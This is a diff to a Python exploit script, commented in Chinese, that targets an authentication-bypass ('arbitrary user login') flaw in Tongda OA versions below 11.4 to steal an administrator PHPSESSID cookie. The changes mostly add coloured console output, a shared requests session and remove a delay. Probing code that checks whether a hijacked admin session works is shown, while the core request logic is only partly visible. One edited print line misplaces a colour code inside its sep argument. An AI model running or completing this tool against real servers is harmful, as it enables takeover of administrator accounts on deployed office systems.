@@ -3,8 +3,16 @@ import time
 import re
 from random import choice
 
+RED = '\x1b[1;91m'
+CYAN = '\033[1;36m'
+GREEN = '\033[1;32m'
+BOLD = '\033[1m'
+END = '\033[0m'
+
+s = requests.session() # 初始化requests.session()会话对象，保持cookie
+
 def getSession(host): # 通达<V11.4任意用户登录获取cookie
-    print('[->] 正在检测通达<V11.4任意用户登录获取cookie')
+    print(CYAN + '[->] 正在检测通达<V11.4任意用户登录获取cookie' + END)
     checkUrl = host+'general/login_code.php'
     try:
         headers = {
@@ -25,12 +33,11 @@ def getSession(host): # 通达<V11.4任意用户登录获取cookie
         check_available = requests.get(host + 'general/index.php',headers=headers)
         if '用户未登录' not in check_available.text:
             if '重新登录' not in check_available.text:
-                print('[*] 成功获得管理员cookie:PHPSESSID=' + PHPSESSION + '\n',sep='')
+                print(GREEN + '[*] 成功获得管理员cookie:PHPSESSID=' + PHPSESSION + '\n',sep='' + END)
         else:
-            print('[-] 未能获取管理员cookie\n')
+            print(RED +'[-] 未能获取管理员cookie\n' + END)
     except:
-        print('[-] 不存在该漏洞\n')
+        print(RED + '[-] 不存在该漏洞\n' + END)
 
 def run(host):
-    time.sleep(6)
     getSession(host)
